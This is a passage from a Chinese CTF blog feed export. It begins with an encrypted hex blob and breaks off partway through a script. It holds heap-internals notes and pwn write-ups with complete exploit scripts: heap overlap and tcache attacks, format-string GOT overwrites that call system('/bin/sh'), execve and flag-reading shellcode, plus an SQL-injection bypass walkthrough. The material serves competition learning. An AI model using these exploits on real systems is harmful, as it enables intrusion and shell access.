792afd8048f83c4f213aad28ffc3218d71db1cce2a54de2425f47d274497aab8d51ce33485b87ab38a61d0780b934360701f93c3c5e20ed99dad4e2fab80445480fdaa9110d3f95ab7bc91d1510582e73e3b5be8cc55e54c44be7a0fcb08050dc3725a9d9a0327284b742f2fa10a7d534d44b7f238b197b57e1c39ed0c7afb56838ad84ac8d84f1e5bb1d21ba3d29312f2c521828bdfc998f54a27894a3037222d29406fce3469c08945869b9a753516be6df5a7757fabec05783bae20bee02435631bc68c6b875f061b7bbb362bca8e57e1947cfbdb829df637ba15042f8fd3b7e8883f160aa2df440480ae849e43749053617c295b131096761709ff4455c93384fe187864f29640ce2bf31d51c2368fc2282c8a6b3121fa546ddc6aa3028e3ecdaf8be1305fcb9054ef66d9768ae842d5c5609904762d3af2c9763afb5c4ef7252983b415fe640c16502269f74db2eed53b720cfb873223d580678ad86a3c27d2851154cfd96aef17b1b5175cae51c5846dae80564452d5a4ac2e29097dc6bd2003f0cc000</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>last_remainder</title>
      <link href="/2019/12/12/last-remainder/"/>
      <url>/2019/12/12/last-remainder/</url>
      
        <content type="html"><![CDATA[<p>切割unsortedbin中的大chunk时：<br>当unsortedbin有对应的freechunk可以给malloc切割使用时，unsortedbin会发生以下步骤：</p><ol><li>先将这些freechunk放置到对应大小的bins链上（放入smallbin或largebin）</li><li>放置到对应的bins链上之后，切割此freechunk</li><li>切割之后会产生last remainder，再将last remainder放到unsortedbin上<blockquote><p>例如：<br>此时，unsortedbin有两个0x800的freechunk<br>此时申请一个0x600的chunk<br>那么unsortedbin会先consolidate，把两个0x800的freechunk先移动到largebin中<br>然后再切割largebin的freechunk，将切割后余留下的0x200放入unsortedbin</p></blockquote></li></ol><p>切割smallbins、largebins中的大chunk时：</p><ol><li>切割smallbins或者largebins中的大freechunk，产生last remainder</li><li>将last remainder放入到unsortedbin中<br>注意（重点）：malloc永远不会去检测切割fastbins（详情见_int_malloc函数的执行顺序）</li></ol><p>这里需要使用一种不需要伪造prevsize来构造overlap的技巧。当申请chunk时，若chunk是从last_remainder上切割下来，那么这个过程中将不会调用到unlink宏，也就不会检测下一chunk的prevsize是否等于当前chunk的size，这样就可以实现无prevsize触发overlap。</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> requests<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./pwn1'</span>libc_name = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'node3.buuoj.cn'</span>port = <span class="hljs-string">'26364'</span>context.arch = <span class="hljs-string">'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]libc = ELF(libc_name)elf = ELF(file_name)p = process(file_name)li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)<span class="hljs-string">'''0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"length&gt; "</span>,str(size))p.sendlineafter(<span class="hljs-string">"content&gt; "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">3</span>))p.sendlineafter(<span class="hljs-string">"index&gt; "</span>,str(idx))fkchunk = <span class="hljs-string">"/bin/sh||aaaaaaa\x31"</span>p.sendlineafter(<span class="hljs-string">"name&gt; "</span>,fkchunk)add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x1f8</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B 1</span>add(<span class="hljs-number">0xf8</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#C 2</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#A 0</span>add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 3</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 4</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 5</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x78</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B1 1</span>add(<span class="hljs-number">0x108</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#B2 2</span>add(<span class="hljs-number">0x8</span>,  <span class="hljs-string">""</span>) <span class="hljs-comment">#B3 6</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#B4 7</span>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#9</span><span class="hljs-comment"># add(0x18, "")</span>free(<span class="hljs-number">3</span>)show(<span class="hljs-number">2</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)free(<span class="hljs-number">8</span>)free(<span class="hljs-number">4</span>)show(<span class="hljs-number">6</span>)heap_addr = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-928</span>+<span class="hljs-number">0x18</span>ls(<span class="hljs-string">"heap addr"</span>,heap_addr)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">9</span>)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">0x20</span>, p64(heap_addr)) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">""</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">"a"</span>*<span class="hljs-number">8</span>+p64(libc.symbols[<span class="hljs-string">'__free_hook'</span>]))p.sendlineafter(<span class="hljs-string">"choice&gt; "</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"remarks&gt;"</span>,p64(libc.symbols[<span class="hljs-string">'system'</span>]))gdb.attach(p)p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF 2019 write up</title>
      <link href="/2019/12/09/SWPUCTF-2019-write-up-md/"/>
      <url>/2019/12/09/SWPUCTF-2019-write-up-md/</url>
      
        <content type="html"><![CDATA[<h1 id="Web">Web<a class="post-anchor" href="#Web"></a></h1><h2 id="easy-web">easy_web<a class="post-anchor" href="#easy-web"></a></h2><p>Description<br>hint1：管理后台未完善 || hint2：无需扫描器 || hint3：不是xss<br>后来的hint：hint1：不是xss || hint2：使用somd5解flag<br>URL <a href="http://211.159.177.185:23456" target="_blank" rel="noopener">http://211.159.177.185:23456</a></p><p>考察的知识点为二次注入，bypass information_schema，通过子查询在没有列名的情况下查询数据</p><p>首先可以看到，有一个申请广告的地方，既然提示了不是xss，那么就自然考虑下sql注入<br>简单测试发现有报错和回显<br><a href="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" alt></a><br>经过测试发现，空格会被替换为空，过滤了or，and以及其他几乎全部报错函数，被一共有22列数据被查询出<br>那么我们可以利用这么一个性质来获取数据库名：在使用一个不存在的函数时，会报错显示当前的数据库名</p><p><a href="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" alt></a></p><p><a href="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" alt></a><br>这样就获取了数据库名<br>因为过滤了or，所以我们就无法使用information来获取表名，本来想用innodb_table_stats来获取表名来着，然鹅mysql这个关键词也被过滤了<br>还有一个叫做sys.schema_auto_increment_columns的表专门记录自增ID，从这里我们也可以获取表名<br><a href="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" alt></a><br>然后还是因为过滤了or和join，我们无法获得列名，只能通过子查询去更改列名<br>因为提示中给的是用somd5解出flag，所以我猜测flag为admin的密码<br><a href="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" alt></a><br><a href="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" alt></a><br>第二个就是admin的密码，用somd5解密即可获得flag</p><h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="MISC">| MISC<a class="post-anchor" href="#MISC"></a></h2><p>内容是ntfs      flag.txt<br>使用ntfsstreamseditor工具，对着桌面扫ntfs流<br>扫出flag</p><h2 id="MISC-1">| MISC<a class="post-anchor" href="#MISC-1"></a></h2><p>binwalk分析一下，很多压缩包<br>binwalk -e分离出来<br>flag.doc里面的密文经过数次bs64解码得到一个密码<br>encode.txt bs64解码之后得到一个密码<br>分别把flag.jpg和good.mp3用密码解压出来<br>mp3文件放到Audacity分析，长音代表- 短音代表·<br>莫斯解密得到MORSEISVERYVERYEASY，<br>小写 swpuctf{morseisveryveryeasy}</p><h2 id="MISC-2">| MISC<a class="post-anchor" href="#MISC-2"></a></h2><p>根据提示ttl，2019西湖论剑misc原题，根据脚本恢复出一个txt文件。文件开头为50 4B，用winhex转为zip文件，需要密码打开压缩包。猜测是zip伪加密，放进ziperello中发现没有加密文件，果然是zip伪加密。010修改压缩包得到里面的flag.txt，是一串加密了n次的base64，脚本解到30次最终解完，但是是乱码。类似HECTF2019misc中flag仍可以被base6<br>4解密一次，所以打印出所有的解密结果，得到flag。</p><h1 id="PWN">PWN<a class="post-anchor" href="#PWN"></a></h1><h2 id="p1Kkheap">p1Kkheap<a class="post-anchor" href="#p1Kkheap"></a></h2><p>保护全开，并且程序自己写了几个限制条件<br>不能申请超过 0x100 大小的 chunk<br>不能 free 超过 3 次，add &lt;= 7<br>虽然有指针悬挂，free 之后 edit 因为 size 清零 不能正常的写值<br>tcache struct attack，爆破低2字节（直接 leak heap addr 也可以），使 fd 指向 heap 开头，控制 tcache_perthread_struct，修改 tcache-&gt;counts 和 tcache_entry</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span><span class="hljs-comment"># p = process('./p1Kkheap')</span>file_name = <span class="hljs-string">'./p1KkHeap'</span>libc_name = <span class="hljs-string">'./libc.so.6'</span>ip = <span class="hljs-string">''</span>prot = <span class="hljs-string">''</span>context.arch = <span class="hljs-string">'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]lib = ELF(libc_name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"size: "</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))p.sendafter(<span class="hljs-string">"content: "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"4"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))shellcode = asm(<span class="hljs-string">'''nopnopmov rax,0x0000push raxmov rax,0x67616c662f2epush raxmov rdi, rspxor esi, esimov eax, 2syscallmov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscall'''</span>)<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<span class="hljs-keyword">try</span>:p = process(file_name)<span class="hljs-comment"># raw_input('#')</span>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span>edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x10\x00'</span>)add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4</span>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701000000000000</span>))free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)p.recvuntil(<span class="hljs-string">"content: "</span>)libc = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)+<span class="hljs-string">"\x00\x00"</span>) - <span class="hljs-number">4111520</span>log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc)malloc_hook = libc+lib.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc addr : 0x%x"</span>%malloc_hook)  edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701010000000000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(malloc_hook)+p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,shellcode)edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x66660002</span>))add(<span class="hljs-number">0x10</span>)<span class="hljs-keyword">except</span> EOFError:p.close()<span class="hljs-keyword">else</span>:p.interactive()<span class="hljs-keyword">break</span></code></pre><h2 id="login">login<a class="post-anchor" href="#login"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./login'</span>libc_name = <span class="hljs-string">'/lib/i386-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'108.160.139.79'</span>port = <span class="hljs-string">'9090'</span><span class="hljs-comment"># context.arch = 'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]lib = ELF(libc_name)elf = ELF(file_name)p = process(file_name)<span class="hljs-comment"># p = remote(ip,int(port))</span>li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)key = <span class="hljs-string">"wllmmllw"</span>p.sendlineafter(<span class="hljs-string">"Please input your name: \n"</span>,<span class="hljs-string">"pumpkin9"</span>)payload = <span class="hljs-string">"%15$p"</span>p.sendlineafter(<span class="hljs-string">"password: \n"</span>,payload)p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)libc = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-241</span>-lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc)onegg = libc + lib.symbols[<span class="hljs-string">'system'</span>]ls(<span class="hljs-string">"one_gadget"</span>,onegg)binsh = libc + lib.search(<span class="hljs-string">'/bin/sh'</span>).next()ls(<span class="hljs-string">"sh addr"</span>,binsh)p.recvuntil(<span class="hljs-string">"Try again!\n"</span>)p.sendline(<span class="hljs-string">"%6$p"</span>)p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)stack = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)target = stack <span class="hljs-number">-12</span>ls(<span class="hljs-string">"stack addr"</span>,stack)ls(<span class="hljs-string">"target addr"</span>,target)<span class="hljs-comment"># gdb.attach(p)</span>num = target&amp;<span class="hljs-number">0xff</span>data1 = <span class="hljs-number">0x100</span><span class="hljs-comment">#onegg&amp;0xff</span>data2 = (onegg&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>data3 = (onegg&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>data4 = onegg&gt;&gt;<span class="hljs-number">24</span>li(<span class="hljs-string">"sys1"</span>,data1)li(<span class="hljs-string">"sys2"</span>,data2)li(<span class="hljs-string">"sys3"</span>,data3)li(<span class="hljs-string">"sys3"</span>,data4)data5 = binsh&amp;<span class="hljs-number">0xff</span>data6 = ((binsh&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>)data7 = ((binsh&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>)data8 = binsh&gt;&gt;<span class="hljs-number">24</span>li(<span class="hljs-string">"sh1"</span>,data5)li(<span class="hljs-string">"sh2"</span>,data6)li(<span class="hljs-string">"sh3"</span>,data7)li(<span class="hljs-string">"sh4"</span>,data8)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data1)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">1</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data2)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">2</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data3)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">3</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data4)+<span class="hljs-string">"c%10$hhn"</span>)gdb.attach(p)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">8</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data5)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">9</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data6)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">10</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data7)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">11</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data8)+<span class="hljs-string">"c%10$hhn"</span>)raw_input(<span class="hljs-string">'#'</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,key)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋-第三季CTF答题赛write up</title>
      <link href="/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/"/>
      <url>/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/</url>
      
        <content type="html"><![CDATA[<p>福利赛 题目还是比较友好的</p><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="Electrical-System">Electrical System<a class="post-anchor" href="#Electrical-System"></a></h2><p>bss 段有可执行权限，写一段shellcode，控制程序跳转即可</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-comment">#p = process("./Electrical System")</span>p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11002</span>)elf=ELF(<span class="hljs-string">"./Electrical System"</span>)shellcode =<span class="hljs-string">"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"</span>p.sendlineafter(<span class="hljs-string">"enter your electric card 's ID:\n"</span>,shellcode)payload = <span class="hljs-string">"Recharge"</span>+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">7</span><span class="hljs-comment"># payload = "Check"+p8(0)+"a"*10</span>payload += p64(<span class="hljs-number">0x00000000006020E0</span>)p.sendlineafter(<span class="hljs-string">"Please enter your choice:\n"</span>,payload)p.interactive()</code></pre><h2 id="Car-Search-System">Car Search System<a class="post-anchor" href="#Car-Search-System"></a></h2><p>格式化字符串，首先leak libc，然后修改0xff为0x66，直接修改栈上的值，程序会down掉，所以可以通过指针v8来修改<br>最后修改puts@got为system。</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment"># context.log_level = 'debug'</span><span class="hljs-comment"># p = process("./pwn")</span>p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11001</span>)elf=ELF(<span class="hljs-string">"./pwn"</span>)lib = ELF(<span class="hljs-string">"./libc6-i386_2.23-0ubuntu10_amd64.so"</span>)offset = <span class="hljs-number">30</span>p.recvuntil(<span class="hljs-string">"leave\n"</span>)p.sendline(<span class="hljs-string">"%59$p"</span>)__libc_start_main = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-247</span><span class="hljs-keyword">print</span> hex(__libc_start_main)libc = __libc_start_main - lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]log.success(<span class="hljs-string">"libc base addr : 0x%x"</span>%libc)system = libc+lib.symbols[<span class="hljs-string">'system'</span>]log.success(<span class="hljs-string">"onegadget addr : 0x%x"</span>%system)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = fmtstr_payload(<span class="hljs-number">30</span>,&#123;elf.got[<span class="hljs-string">"puts"</span>]:system&#125;)p.sendline(payload)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = <span class="hljs-string">"%51$p"</span>p.sendline(payload)point = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)log.success(<span class="hljs-string">"pointer addr : 0x%x"</span>%point)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = p32(point)+<span class="hljs-string">"%98c%30$hhn"</span>p.sendline(payload)p.sendlineafter(<span class="hljs-string">"ar in 7 day"</span>,<span class="hljs-string">"/bin/sh\x00"</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h2 id="geek-notes">geek notes<a class="post-anchor" href="#geek-notes"></a></h2><p>UAF</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><span class="hljs-comment"># encoding:utf-8</span><span class="hljs-comment"># ___Author___ : "pumpkin9"</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context(terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>])p =process(<span class="hljs-string">"./geek notes"</span>)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span><span class="hljs-params">(length,content)</span>:</span>p.recvuntil(<span class="hljs-string">"Your choice :"</span>)p.sendline(<span class="hljs-string">"1"</span>)p.recvuntil(<span class="hljs-string">"Note size :"</span>)p.sendline(str(length))p.recvuntil(<span class="hljs-string">"Content :"</span>)p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">"Your choice :"</span>)p.sendline(<span class="hljs-string">"2"</span>)p.recvuntil(<span class="hljs-string">"Index :"</span>)p.sendline(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span><span class="hljs-params">(idx)</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"3"</span>)p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(str(idx))addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 0</span>addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 1</span>delnote(<span class="hljs-number">0</span>)printnote(<span class="hljs-number">0</span>)libc_base = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\x00\x00'</span>)<span class="hljs-number">-3951480</span>log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc_base)malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span 